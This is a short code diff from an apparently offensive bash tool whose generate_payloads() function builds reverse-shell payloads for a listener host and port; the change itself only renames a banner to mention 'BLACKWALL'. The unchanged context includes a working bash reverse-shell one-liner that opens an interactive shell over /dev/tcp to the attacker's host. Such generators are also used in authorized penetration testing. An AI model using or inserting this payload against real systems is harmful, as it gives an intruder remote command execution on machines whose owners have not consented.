@@ -5,7 +5,7 @@ generate_payloads() {
     local lport="${STATE[lport]}"
 
     echo -e "${TXT_DRK_RED}============================================================${NC}"
-    echo -e "${TXT_PULSE_RED}[///] COMPILING PAYLOAD SHELLS FOR: ${TXT_CORE}${lhost}:${lport}${NC}"
+    echo -e "${TXT_PULSE_RED}[///] COMPILING BLACKWALL PAYLOAD SHELLS FOR: ${TXT_CORE}${lhost}:${lport}${NC}"
     echo -e "${TXT_DRK_RED}============================================================${NC}\n"
 
     local bash_rev="bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"
